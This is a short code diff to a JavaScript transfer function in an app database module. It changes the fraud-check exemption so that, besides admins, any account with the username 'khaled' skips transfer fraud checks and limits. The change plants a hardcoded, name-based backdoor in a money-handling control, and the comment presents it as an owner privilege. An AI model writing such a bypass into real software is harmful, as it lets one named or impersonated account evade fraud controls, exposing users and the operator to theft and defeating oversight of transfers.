@@ -821,8 +821,8 @@ var AppDB = (() => {
     const sender = { ...(senderRow.state || {}), ...senderRow };
     const recipient = { ...(recipientRow.state || {}), ...recipientRow };
 
-    // Admin accounts bypass transfer fraud checks
-    if (sender.is_admin || senderRow.is_admin) {
+    // Admin / Owner accounts (Khaled) bypass transfer fraud checks and limits
+    if (sender.is_admin || senderRow.is_admin || sUser.toLowerCase() === 'khaled') {
       return true;
     }
 
